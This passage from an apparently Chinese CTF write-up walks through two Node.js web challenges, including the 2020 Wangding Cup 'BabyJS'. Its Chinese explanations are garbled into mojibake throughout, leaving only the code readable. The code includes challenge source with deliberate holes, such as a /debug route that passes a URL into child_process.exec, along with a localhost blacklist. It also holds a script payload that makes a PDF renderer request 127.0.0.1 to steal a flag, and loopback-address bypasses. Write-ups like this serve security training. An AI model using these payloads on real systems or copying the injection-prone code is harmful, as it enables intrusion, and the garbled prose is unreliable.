&#123; error : &#x27;Parameters cannot be blank üòí&#x27;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;<strong>‰∏ã</strong>GET</strong>ËØ∑Ê±ÇÂÖ∂ÂÆûÂπ∂Ê≤°Êúâ‰ªÄ‰πàÊìç‰ΩúÔºåÊàë‰ª¨‰∏ªË¶ÅÊù•Áúã<strong>POST</strong>ËØ∑Ê±ÇÔºåËé∑Âèñ<strong>username</strong>Âíå<strong>password</strong>ÂêéÊòæÁ§∫Âà§Êñ≠Á±ªÂûãÔºåÁÑ∂ÂêéÂíåÊï∞ÊçÆÂ∫ìÂÜÖÊï∞ÊçÆËøõË°åÊØîÂØπÔºåÊØîÂØπÊàêÂäüË∑≥ËΩ¨Âà∞**&#x2F;admin**Ë∑ØÁî±ÔºåÂêåÊó∂‰ªñ‰ºöÊääË∫´‰ªΩ‰ø°ÊÅØÊâîÂà∞tokenÈáå</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res.cookie(&#x27;token&#x27;, &#123;</span><br><span class="line">            username: username,</span><br><span class="line">            isAdmin: true </span><br><span class="line">        &#125;, &#123; signed: true &#125;)</span><br></pre></td></tr></table></figure>

<p>Êó¢ÁÑ∂Ë∑≥ËΩ¨Âà∞**&#x2F;admin<strong>Ë∑ØÁî±ÔºåÊàë‰ª¨Â∞±Âéª</strong>&#x2F;admin**Ë∑ØÁî±‰∏ãÁúã‰∏ÄÁúº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/admin&#x27;, checkAuth, async (req, res) =&gt; &#123;</span><br><span class="line">    let token = req.signedCookies[&#x27;token&#x27;];</span><br><span class="line">    try &#123;</span><br><span class="line">        const files = await DB.listFile(token.username);</span><br><span class="line">        if (files) &#123;</span><br><span class="line">            res.cookie(&#x27;token&#x27;, &#123;username: token.username, files: files, isAdmin: true &#125;, &#123; signed: true &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        return res.render(&#x27;admin&#x27;, &#123; error: &#x27;Something wrong ... üëª&#x27;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    return res.render(&#x27;admin&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/admin&#x27;, checkAuth, (req, res, next) =&gt; &#123;</span><br><span class="line">    let &#123; content &#125; = req.body;</span><br><span class="line">    if ( content == &#x27;&#x27; || content.includes(&#x27;&lt;&#x27;) || content.includes(&#x27;&gt;&#x27;) || content.includes(&#x27;/&#x27;) || content.includes(&#x27;script&#x27;) || content.includes(&#x27;on&#x27;))&#123;</span><br><span class="line">        // even admin can&#x27;t be trusted right ? :)  </span><br><span class="line">        return res.render(&#x27;admin&#x27;, &#123; error: &#x27;Forbidden word ü§¨&#x27;&#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let template = `</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;h3&gt;$&#123;content&#125;&lt;/h3&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        `</span><br><span class="line">        try &#123;</span><br><span class="line">            const filename = `$&#123;uuid()&#125;.pdf`</span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                &quot;format&quot;: &quot;Letter&quot;,</span><br><span class="line">                &quot;orientation&quot;: &quot;portrait&quot;,</span><br><span class="line">                &quot;border&quot;: &quot;0&quot;,</span><br><span class="line">                &quot;type&quot;: &quot;pdf&quot;,</span><br><span class="line">                &quot;renderDelay&quot;: 3000,</span><br><span class="line">                &quot;timeout&quot;: 5000</span><br><span class="line">            &#125;).toFile(`./files/$&#123;filename&#125;`, async (err, _) =&gt; &#123;</span><br><span class="line">                if (err) next(createError(500));</span><br><span class="line">                const checksum = await getCheckSum(filename);</span><br><span class="line">                await DB.Create(&#x27;superuser&#x27;, filename, checksum)</span><br><span class="line">                return res.render(&#x27;admin&#x27;, &#123; message : `Your pdf is successfully saved ü§ë You know how to download it right?`&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.render(&#x27;admin&#x27;, &#123; error : &#x27;Failed to generate pdf üò•&#x27;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰∏çÁÆ°ÊòØ<strong>GET</strong>ËøòÊòØ<strong>POST</strong>ÁöÑËØ∑Ê±ÇÔºåÈÉΩ‰ºöË∞ÉÁî®<strong>checkAuth</strong>ÊñπÊ≥ï</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const checkAuth = (req: Request, res:Response, next:NextFunction) =&gt; &#123;</span><br><span class="line">    let token = req.signedCookies[&#x27;token&#x27;]</span><br><span class="line">    if (token &amp;&amp; token[&quot;username&quot;]) &#123;</span><br><span class="line">        if (token.username === &#x27;superuser&#x27;)&#123;</span><br><span class="line">            next(createError(404)) // superuser is disabled since you can&#x27;t even find it in database :)</span><br><span class="line">        &#125;</span><br><span class="line">        if (token.isAdmin === true) &#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return res.redirect(&#x27;/&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        next(createError(404));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ëøô‰∏™ÊñπÊ≥ï‰πüÊå∫Â•ΩÁêÜËß£ÁöÑÔºåÂ∞±ÊòØËøáÊª§Êéâ‰∫Ü<strong>superuser</strong>ÔºåtokenÊï∞ÊçÆ‰∏≠‰∏çËÉΩÂåÖÂê´<strong>superuser</strong></p>
<p>ÂõûÂà∞**&#x2F;admin<strong>Ë∑ØÁî±Ôºå</strong>GET**ËØ∑Ê±Ç‰∏ãÊúâ‰∏Ä‰∏™<code> const files = await DB.listFile(token.username);</code> Êàë‰ª¨Âú®Êï∞ÊçÆÂ∫ìÊñá‰ª∂ÈáåÂèØ‰ª•ÊâæÂà∞Ëøô‰∏™ÊñπÊ≥ïÁöÑÂÆö‰πâ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static listFile(username: string): Promise&lt;any&gt; &#123;</span><br><span class="line">        return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">            db.all(`SELECT filename, checksum FROM files WHERE username = ? ORDER BY filename`, username, (err, result) =&gt; &#123;</span><br><span class="line">                if (err) return reject(err);</span><br><span class="line">                resolve(result);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Ëøô‰∏™ÊñπÊ≥ïÂ∞ÜËØ•Áî®Êà∑Âêç‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂ÂêçÂíåchecknumÈÉΩÁªôËæìÂá∫ÔºåÂõûÂà∞<strong>GET</strong>ËØ∑Ê±ÇÔºåÂ∞ÜËøô‰∫õ‰ø°ÊÅØÊîæÂÖ•token‰∏≠</p>
<p>ÁÑ∂ÂêéÊù•Áúã<strong>POST</strong>ËØ∑Ê±ÇÔºåÂêåÊ†∑ÂÖàÊòØËøáÊª§Êéâ‰∫Ü<strong>superuser</strong>ÔºåÁÑ∂ÂêéÂØπ<strong>content</strong>‰ø°ÊÅØËøõË°åËøáÊª§ÔºåÁªïËøáËøáÊª§ÂêéÊää<strong>content</strong>‰ø°ÊÅØÊîæÂÖ•‰∏Ä‰∏™htmlÊ®°Êùø‰∏≠ÔºåÁÑ∂ÂêéÂú®<code>./files/</code>ÁõÆÂΩï‰∏ãÁîüÊàê‰∏Ä‰∏™pdfÊñá‰ª∂</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const getCheckSum = (filename: string): Promise&lt;string&gt; =&gt; &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        const shasum = crypto.createHash(&#x27;md5&#x27;);</span><br><span class="line">        try &#123;</span><br><span class="line">            const s = fs.createReadStream(path.join(__dirname , &quot;../files/&quot;, filename));</span><br><span class="line">            s.on(&#x27;data&#x27;, (data) =&gt; &#123;</span><br><span class="line">                shasum.update(data)</span><br><span class="line">            &#125;)</span><br><span class="line">            s.on(&#x27;end&#x27;, () =&gt; &#123;</span><br><span class="line">                return resolve(shasum.digest(&#x27;hex&#x27;));</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ê†πÊçÆÊñá‰ª∂ÂêçÁîüÊàê‰∏ÄÊÆµÈöèÊú∫Êï∞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await DB.Create(&#x27;superuser&#x27;, filename, checksum)</span><br></pre></td></tr></table></figure>

<p>ÊääÈöèÊú∫Êï∞ÂíåÊñá‰ª∂ÂêçÊîæÂà∞superuser‰∏ãÔºåÂà∞ËøôÈáå**&#x2F;admin**Ë∑ØÁî±Â∞±Â∑Æ‰∏çÂ§öËß£ÈáäÂÆå‰∫Ü</p>
<p>ÁÑ∂ÂêéÊù•Áúã**&#x2F;api&#x2F;files**Ë∑ØÁî±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/api/files&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class="line">    if (req.socket.remoteAddress.replace(/^.*:/, &#x27;&#x27;) != &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">        return next(createError(401));</span><br><span class="line">    &#125;</span><br><span class="line">    let &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    if (typeof(username) == &quot;string&quot; &amp;&amp; typeof(filename) == &quot;string&quot; &amp;&amp; typeof(checksum) == &quot;string&quot;) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            await DB.Create(username, filename, checksum)</span><br><span class="line">            return res.send(&#x27;Done&#x27;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.send(&#x27;Error!&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return res.send(&#x27;Parameters error&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ÁÆÄÂçïÁ≤óÊö¥ÔºåÂè™ËÉΩÊú¨Âú∞ËÆøÈóÆÔºåËØ¥ÊòéÈúÄË¶ÅÊàë‰ª¨ssrfÔºåÁÑ∂ÂêéÊääËøô‰∏â‰∏™Êï∞ÊçÆÂÜôÂÖ•Êï∞ÊçÆÂ∫ì</p>
<p>ÊúÄÂêéÁúã**&#x2F;api&#x2F;files&#x2F;:id**Ë∑ØÁî±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/api/files/:id&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    let token = req.signedCookies[&#x27;token&#x27;]</span><br><span class="line">    if (token &amp;&amp; token[&#x27;username&#x27;]) &#123;</span><br><span class="line">        if (token.username == &#x27;superuser&#x27;) &#123;</span><br><span class="line">            return res.send(&#x27;Superuser is disabled now&#x27;);   </span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            let filename = await DB.getFile(token.username, req.params.id)</span><br><span class="line">            if (fs.existsSync(path.join(__dirname , &quot;../files/&quot;, filename)))&#123;</span><br><span class="line">                return res.send(await readFile(path.join(__dirname , &quot;../files/&quot;, filename)));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return res.send(&#x27;No such file!&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.send(&#x27;Error!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return res.redirect(&#x27;/&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‰πüÊå∫Â•ΩÁêÜËß£ÁöÑÔºåÈôêÂà∂<strong>superuser</strong>Ë∫´‰ªΩÔºåÊ†πÊçÆÊàë‰ª¨ËæìÂÖ•ÁöÑ<strong>id</strong>ÂéªÊâæÂà∞Áõ∏Â∫îÁöÑÊñá‰ª∂Âπ∂ËÆøÈóÆ</p>
<p>ÁúãÂÆåÊï¥ÊÆµ‰ª£Á†ÅÔºåÂõûÂà∞Êàë‰ª¨‰∏ÄÂºÄÂßãÂèëÁé∞ÁöÑ‰∏§‰∏™‰ø°ÊÅØ</p>
<p>‰∏Ä‰∏™ÊòØ<strong>admin</strong>Ë∫´‰ªΩÁöÑË¥¶Âè∑ÂíåÂØÜÁ†ÅÔºåÂè¶‰∏Ä‰∏™ÂæàÊòéÊòæÊòØÊàë‰ª¨ÈúÄË¶ÅËé∑ÂæóÁöÑflag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO files (username, filename, checksum) VALUES (&#x27;superuser&#x27;,&#x27;flag&#x27;,&#x27;be5a14a8e504a66979f6938338b0662c&#x27;);`);</span><br></pre></td></tr></table></figure>

<p>‰ΩÜÊàë‰ª¨ÂèëÁé∞ÈóÆÈ¢ò<strong>flag</strong>Â±û‰∫é<strong>superuser</strong>Ôºå‰ΩÜ<strong>superuser</strong>‰∏çËÉΩÁî®Ôºå‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÈúÄË¶ÅÊää<strong>flag</strong>Áªô<strong>admin</strong></p>
<p>ÊâÄ‰ª•Êàë‰ª¨Êù•ÁêÜ‰∏Ä‰∏ãÊÄùË∑ØÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá**&#x2F;admin<strong>ÁöÑ</strong>POST<strong>ËØ∑Ê±ÇÊù•ÂÆûÁé∞ssrfÔºåÈÄöËøá</strong>&#x2F;api&#x2F;files<strong>Êù•ÂÜôÂÖ•Êï∞ÊçÆÔºåÈÄöËøáÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ÁöÑÊñá‰ª∂ÂêçÂëΩ‰ª§ÊâßË°åÔºåÊääflagÁªô</strong>admin**</p>
<p>ËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•Êù•ËøõË°åÊûÑÈÄ†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var xhr = new XMLHttpRequest();xhr.open(&quot;GET&quot;, &quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123&quot;, true);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ËøôÈ¢òÁõ¥Êé•ÂÄüÈâ¥Â§ß‰Ω¨ÁöÑpayloadÔºåËøôÈáåÈúÄË¶ÅÁî®Âà∞xxeÔºåÁ≠ânodeÂ≠¶ÁöÑÂ∑Æ‰∏çÂ§ö‰∫ÜÔºåÊâìÁÆóÂÖàÂéªÁúã‰∏Ä‰∏ãxxeÁöÑÁü•ËØÜÁÇπ‰∫Ü</p>
<p>Ëøô‰∏™payloadÊï¥‰ΩìËøòÊòØÁúãÁöÑÊáÇÁöÑÔºåËß£Èáä‰∏Ä‰∏™ÁÇπÔºå‰∏∫‰ªÄ‰πàÊää<code>filename=./flag</code>ÔºåÂÖ∂ÂÆû‰πüÂæàÂ•ΩÁêÜËß£</p>
<p><img src="/../image/588.png" class="lazyload" data-srcset="/../image/588.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="588"></p>
<p>Êàë‰ª¨ÁúãÂà∞ÂàõÂª∫ÁöÑtable‰∏≠ÂèØ‰ª•ÂèëÁé∞<code>filename  VARCHAR(255) NOT NULL UNIQUE</code>‰πüÂ∞±ÊòØflagÂéüÊú¨Â∞±Â∑≤ÁªèÂú®Â≠òÂú®‰∫ÜÔºåÊâÄ‰ª•ÂèØ‰ª•Âà©Áî®<code>./flag</code>ËøõË°åÁªïËøá</p>
<p>ÂÜôÂÖ•ÂêéËÆøÈóÆ**&#x2F;api&#x2F;files&#x2F;123**Âç≥ÂèØËé∑Âæóflag</p>
<h2 id="ÁΩëÈºéÊùØ-2020-ÂçäÂÜ≥Ëµõ-BabyJS"><a href="#ÁΩëÈºéÊùØ-2020-ÂçäÂÜ≥Ëµõ-BabyJS" class="headerlink" title="[ÁΩëÈºéÊùØ 2020 ÂçäÂÜ≥Ëµõ]BabyJS"></a>[ÁΩëÈºéÊùØ 2020 ÂçäÂÜ≥Ëµõ]BabyJS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var config = require(&#x27;../config&#x27;);</span><br><span class="line">var url=require(&#x27;url&#x27;);</span><br><span class="line">var child_process=require(&#x27;child_process&#x27;);</span><br><span class="line">var fs=require(&#x27;fs&#x27;);</span><br><span class="line">var request=require(&#x27;request&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var blacklist=[&#x27;127.0.0.1.xip.io&#x27;,&#x27;::ffff:127.0.0.1&#x27;,&#x27;127.0.0.1&#x27;,&#x27;0&#x27;,&#x27;localhost&#x27;,&#x27;0.0.0.0&#x27;,&#x27;[::1]&#x27;,&#x27;::1&#x27;];</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">    res.json(&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/debug&#x27;, function(req, res, next) &#123;</span><br><span class="line">    console.log(req.ip);</span><br><span class="line">    if(blacklist.indexOf(req.ip)!=-1)&#123;</span><br><span class="line">        console.log(&#x27;res&#x27;);</span><br><span class="line">	var u=req.query.url.replace(/[\&quot;\&#x27;]/ig,&#x27;&#x27;);</span><br><span class="line">	console.log(url.parse(u).href);</span><br><span class="line">	let log=`echo  &#x27;$&#123;url.parse(u).href&#125;&#x27;&gt;&gt;/tmp/log`;</span><br><span class="line">	console.log(log);</span><br><span class="line">	child_process.exec(log);</span><br><span class="line">	res.json(&#123;data:fs.readFileSync(&#x27;/tmp/log&#x27;).toString()&#125;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        res.json(&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/debug&#x27;, function(req, res, next) &#123;</span><br><span class="line">    console.log(req.body);</span><br><span class="line">    if(req.body.url !== undefined) &#123;</span><br><span class="line">        var u = req.body.url;</span><br><span class="line">	var urlObject=url.parse(u);</span><br><span class="line">	if(blacklist.indexOf(urlObject.hostname) == -1)&#123;</span><br><span class="line">		var dest=urlObject.href;</span><br><span class="line">		request(dest,(err,result,body)=&gt;&#123;</span><br><span class="line">			res.json(body);</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		res.json([]);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Á®çÂæÆÊâæ‰∫Ü‰∏Ä‰∏ã‰∏ªÂáΩÊï∞ÔºåÁúãÂà∞ÈªëÂêçÂçïÔºåÂæàÂÆπÊòìÊÉ≥Âà∞ssrfÔºåÁåúÊµãËÄÉÁÇπÊòØssrf + node.js </p>
<p>ÁÑ∂ÂêéÊàë‰ª¨ÂÖ∑‰ΩìÊù•Áúã‰ª£Á†ÅÔºåÂâçÈù¢Ê≤°‰ªÄ‰πàÂ•ΩÁúãÁöÑÔºåÊ†π Ë∑ØÁî±‰∏ãÈù¢Ê≤°Êúâ‰ªÄ‰πà‰∏úË•øÔºå‰ΩÜ‰∏§‰∏™**&#x2F;debug**Ë∑ØÁî±‰∏ãÈù¢Â∞±ÊØîËæÉÊúâÊÑèÊÄù‰∫ÜÔºåËøôÈáåÂ§ßËá¥Áúã‰∫Ü‰∏Ä‰∏ãÈÉΩÁî®Âà∞‰∫ÜÈªëÂêçÂçïÔºå‰ΩÜÊòØ‰∏§‰∏™Ê£ÄÊµãÁöÑ‰∏úË•ø‰∏çÂêåÔºåÊàë‰ª¨Á®çÂæÆÊù•Áúã‰∏Ä‰∏ã</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist.indexOf(urlObject.hostname) == -1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist.indexOf(req.ip)!=-1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url.parse(u).href</span><br></pre></td></tr></table></figure>

<p>Êàë‰ª¨ÂÖ∑‰ΩìÁúã‰∏Ä‰∏ã</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const &#123; URL &#125; = require(&#x27;url&#x27;);</span><br><span class="line"></span><br><span class="line">const u = &#x27;http://127.0.0.1:8080/path/name?query=string#hash&#x27;;</span><br><span class="line"></span><br><span class="line">let parsedUrl = new URL(u);</span><br><span class="line">console.log(parsedUrl);</span><br><span class="line">/**URL &#123;</span><br><span class="line">  href: &#x27;http://127.0.0.1:8080/path/name?query=string#hash&#x27;,</span><br><span class="line">  origin: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">  protocol: &#x27;http:&#x27;,</span><br><span class="line">  username: &#x27;&#x27;,</span><br><span class="line">  password: &#x27;&#x27;,</span><br><span class="line">  host: &#x27;127.0.0.1:8080&#x27;,</span><br><span class="line">  hostname: &#x27;127.0.0.1&#x27;,</span><br><span class="line">  port: &#x27;8080&#x27;,</span><br><span class="line">  pathname: &#x27;/path/name&#x27;,</span><br><span class="line">  search: &#x27;?query=string&#x27;,</span><br><span class="line">  searchParams: URLSearchParams &#123; &#x27;query&#x27; =&gt; &#x27;string&#x27; &#125;,</span><br><span class="line">  hash: &#x27;#hash&#x27;</span><br><span class="line">&#125;**/</span><br><span class="line">console.log(parsedUrl.href);//http://127.0.0.1:8080/path/name?query=string#has</span><br><span class="line">console.log(parsedUrl.hostname)//127.0.0.1</span><br></pre></td></tr></table></figure>

<p>okÔºåÂõûÂà∞È¢òÁõÆ‰∏äÔºåÂæàÊòéÊòæÂèØ‰ª•ÂèëÁé∞<strong>GET</strong>ËØ∑Ê±Ç‰∏ãÁöÑÊ£ÄÊµãÊõ¥Âä†‰∏•Ê†ºÔºåÂÆÉÊòØÂØπ<strong>ip</strong>ËøõË°åÊ£ÄÊµãÔºåËÄå<strong>POST</strong>ËØ∑Ê±Ç‰∏ãÂè™ÊòØÂØπ‰º†ÂÖ•url‰∏≠ÁöÑ‰∏ªÊú∫ÂêçËøõË°åÊ£ÄÊµã</p>
<p>ÂÖ∂ÂÆû‰ªîÁªÜÁúãËøòÊòØÊúâÂäûÊ≥ïËøõË°åÁªïËøáÁöÑÔºåÊàë‰ª¨ÂÖàÈÄöËøá<strong>POST</strong>ËØ∑Ê±Ç‰∏ãÂÖàÁªïËøáÂØπ<strong>href</strong>ÁöÑÊ£ÄÊµãÔºåËøô‰∏™ËøòÊòØÊØîËæÉÁÆÄÂçïÁöÑÔºåÁõ¥Êé•Âà©Áî®ËøõÂà∂ËΩ¨Âåñ<strong>0177.0.0.1</strong>ÊàñËÄÖÂà©Áî®<strong>127.1</strong>ÈÉΩÂèØ‰ª•ËøõË°åÁªïËøáÁÑ∂ÂêéÂÜçÈÄöËøá<strong>POST</strong>ËØ∑Ê±ÇÂèëÈÄÅ‰∏Ä‰∏™<strong>json</strong>ËØ∑Ê±Ç</p>
<p><img src="/../image/589.png" class="lazyload" data-srcset="/../image/589.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="589"></p>
